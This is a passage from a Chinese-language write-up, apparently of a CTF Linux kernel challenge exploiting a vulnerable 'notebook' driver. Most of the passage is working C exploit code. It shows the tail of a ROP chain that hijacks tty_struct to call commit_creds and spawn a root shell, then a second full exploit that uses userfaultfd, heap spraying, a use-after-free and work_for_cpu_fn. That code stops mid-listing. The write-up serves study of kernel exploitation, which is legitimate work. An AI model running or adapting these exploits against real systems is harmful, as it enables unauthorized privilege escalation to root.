<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// first migration to tty_struct</span><br>    ((struct tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br>    <span class="hljs-comment">// second migration back to tty_operations</span><br>    fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-comment">// third migration to a note</span><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-comment">// final rop</span><br>    <span class="hljs-keyword">int</span> rop_idx = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0x3361626e74747261</span>; <span class="hljs-comment">//arttnba3</span><br>    rop[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = prepare_kernel_cred;<br>    rop[rop_idx++] = POP_RDX_RET + kernel_offset;<br>    rop[rop_idx++] = RET;<br>    rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0x3361626e74747261</span>; <span class="hljs-comment">//arttnba3</span><br>    rop[rop_idx++] = commit_creds;<br>    rop[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-keyword">size_t</span>) &amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    write(note_fd, rop, fake_stack_idx);                    <span class="hljs-comment">// copy the ropchain</span><br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    <span class="hljs-comment">// hijack the tty_operations</span><br>    write(note_fd, fake_tty_data, tty_idx);                 <span class="hljs-comment">// hijack the tty_struct</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        write(tty_fd[i], page, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可成功提权到 root</p><p><a href="https://i.loli.net/2021/09/10/YOaE1mUfiHuRQKF.png"><img src="https://s2.loli.net/2023/02/06/of3ILh8OD16lzaV.png" alt="image.png"></a></p><blockquote><p>经笔者多次测试，在开头的几步操作结束后都 sleep(1) 会<strong>极大地提高利用的稳定性</strong>（主要是等待多个线程启动完成），不过由于资源限制所能喷的 tty_struct 就少了些（但也够用了）</p></blockquote><h3 id="解法二：userfaultfd-heap-spray-kernel-UAF"><a href="#解法二：userfaultfd-heap-spray-kernel-UAF" class="headerlink" title="解法二：userfaultfd + heap spray + kernel UAF"></a>解法二：userfaultfd + heap spray + kernel UAF</h3><blockquote><p>参考了<a href="https://zhuanlan.zhihu.com/p/385645268">长亭的WP</a></p></blockquote><p>前半部分与解法一基本上相同，但是在劫持 tty_struct 后并不是通过复杂的多次栈迁移进行利用，而是通过一个更为稳定的函数——</p><h4 id="work-for-cpu-fn-稳定化利用"><a href="#work-for-cpu-fn-稳定化利用" class="headerlink" title="work_for_cpu_fn 稳定化利用"></a>work_for_cpu_fn 稳定化利用</h4><p>在开启了多核支持的内核中都有这个函数，定义于 <code>kernel/workqueue.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br>    <span class="hljs-keyword">long</span> (*fn)(<span class="hljs-keyword">void</span> *);<br>    <span class="hljs-keyword">void</span> *arg;<br>    <span class="hljs-keyword">long</span> ret;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span><span class="hljs-params">(struct work_struct *work)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> *<span class="hljs-title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>简单分析可知该函数可以理解为如下形式：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    args[<span class="hljs-number">6</span>] = ((<span class="hljs-keyword">size_t</span> (*) (<span class="hljs-keyword">size_t</span>)) (args[<span class="hljs-number">4</span>](args[<span class="hljs-number">5</span>]));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>即 <code>rdi + 0x20</code> 处作为函数指针执行，参数为 <code>rdi + 0x28</code> 处值，返回值存放在 <code>rdi + 0x30</code> 处，由此我们可以<strong>很方便地分次执行 prepare_kernel_cred 和 commit_creds，且不用考虑 KPTI 绕过，直接返回用户态便能完成稳定化提权</strong></p><p>与之前不同的是在这里选择劫持 tty_operations 中的 ioctl 而不是 write，因为 tty_struct[4] 处成员 <code>ldisc_sem</code> 为信号量，在执行到 work_for_cpu_fn 之前<strong>该值会被更改</strong></p><p>需要注意的是 tty_operations 中的 ioctl 并不是直接执行的，此前需要经过多道检查，因此我们应当传入恰当的参数</p><p>exp如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">long</span> note_fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteAdd(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteEdit(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_add);<br>    noteAdd((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    noteEdit((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span> * buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">pthread_t</span> <span class="hljs-keyword">tmp_t</span>, <span class="hljs-keyword">add_t</span>, <span class="hljs-keyword">edit_t</span>;<br>    Note note;<br><br>    saveStatus();<br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-comment">// initialize the notebook</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        noteAdd(i, <span class="hljs-number">0x20</span>, page);<br>        noteEdit(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// get all the note free and get the threads stuck by userfaultfd to save their ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// heap spraying to hit the tty_struct</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// check whether we&#x27;ve hit the tty_struct</span><br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-keyword">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span 